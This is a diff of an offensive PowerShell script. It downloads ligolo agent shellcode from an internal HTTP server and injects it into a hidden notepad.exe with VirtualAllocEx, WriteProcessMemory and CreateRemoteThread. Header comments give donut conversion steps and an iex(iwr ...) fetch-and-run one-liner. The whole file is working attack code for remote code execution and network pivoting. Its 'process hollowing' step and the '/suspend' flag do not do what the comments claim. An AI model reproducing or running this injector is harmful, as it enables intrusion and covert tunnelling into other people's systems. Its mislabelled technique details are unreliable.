@@ -1,37 +1,25 @@
 #1 Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
 #2 Make sure you are running as x64 bit process before running.
-#4 Invoke it: iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)
+#3 Run before invoke: taskkill /F /IM:notepad.exe 
+#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-Hollow.ps1 -UseBasicParsing)
 
-# Step 1: Check if running as a 64-bit process
+# Check that we are running as 64bit process
 if ([System.IntPtr]::Size -ne 8) {
-    # Check if the script is already running in 64-bit PowerShell
-    if (-not $env:IS_64BIT) {
-        Write-Host "32-bit PowerShell detected. please make sure to switch to 64 bit before running again. `nExecute: C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe`nAnd try again."
-	exit
-	}
-}
-
-# If we're in a 64-bit process, continue with the rest of the script
-Write-Host "Running as a 64-bit process..."
-
-# Step 2: Start notepad.exe in suspended mode
-Write-Host "Starting notepad.exe in suspended mode..."
-$notepadProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru
-$procid = $notepadProcess.Id
-Write-Host "Started notepad.exe with PID: $procid"
-
-# Step 3: Download the shellcode (agent.bin)
-$url = "http://192.168.45.223/agent.bin"
-Write-Host "Downloading shellcode from $url..."
-try {
-    $shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-    Write-Host "Shellcode downloaded successfully, size: $($shellcode.Length) bytes."
-} catch {
-    Write-Error "Failed to download shellcode: $_"
+    Write-Error "This script must be run as a 64-bit process."
     exit
 }
 
-# Step 4: Add required native methods
+# Step 2: Start svchost.exe in suspended mode
+Write-Host "Starting notepad.exe in suspended mode..."
+$notepadProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru -ArgumentList "/suspend"
+$procid = $notepadProcess.Id
+Write-Host "Started notepad.exe with PID: $procid"
+
+# Step 3: Download the raw shellcode from the remote server
+$url = "http://192.168.45.168/agent.bin"
+$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -46,39 +34,50 @@ public class Kernel32 {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
 
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool ResumeThread(IntPtr hThread);
 }
 "@ -Language CSharp
 
-# Step 5: Define constants
 $PROCESS_ALL_ACCESS = 0x1F0FFF
+$PROCESS_CREATE_THREAD = 0x0002
+$PROCESS_VM_OPERATION = 0x0008
+$PROCESS_VM_WRITE = 0x0020
+$PROCESS_VM_READ = 0x0010
 $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PAGE_EXECUTE_READWRITE = 0x40
 
-# Step 6: Open the target process (notepad.exe)
+# Open the process in suspended mode
 $hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
 if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Error "Failed to open target process."
+    Write-Error "Failed to open process."
     exit
 }
 
-# Step 7: Allocate memory in the target process
-Write-Host "Allocating memory in the target process..."
+# Retrieve process information (Get entry point & image base)
+$hThread = (Get-Process -Id $procid).Threads[0].Id
+$procInfo = (Get-WmiObject Win32_Process -Filter "ProcessId = '$procid'").ExecutablePath
+
+# Allocate memory in the target process
 $size = $shellcode.Length
 $addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
 if ($addr -eq [IntPtr]::Zero) {
-    Write-Error "Memory allocation failed."
+    Write-Error "Failed to allocate memory in the target process."
     [Kernel32]::CloseHandle($hProcess)
     exit
 }
 
-# Step 8: Write shellcode to the allocated memory
-Write-Host "Writing shellcode to allocated memory..."
+# Write shellcode to the allocated memory
 $out = 0
 $result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
 if (-not $result) {
@@ -87,14 +86,18 @@ if (-not $result) {
     exit
 }
 
-# Step 9: Create a remote thread to execute the shellcode
-Write-Host "Creating remote thread to execute shellcode..."
+# Free the memory of the original image (process hollowing)
+$peBaseAddr = [IntPtr]::Zero
+[Kernel32]::VirtualFreeEx($hProcess, $peBaseAddr, 0, 0x8000)
+
+# Resume the process after injection of shellcode
 $thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 if ($thread -eq [IntPtr]::Zero) {
-    Write-Error "Failed to create remote thread."
-    [Kernel32]::CloseHandle($hProcess)
-    exit
+    Write-Error "Failed to create remote thread in the target process."
+}
+else {
+    [Kernel32]::ResumeThread($thread)
+    Write-Output "Shellcode injected via process hollowing successfully!"
 }
 
-Write-Host "Shellcode injected and executed successfully."
 [Kernel32]::CloseHandle($hProcess)
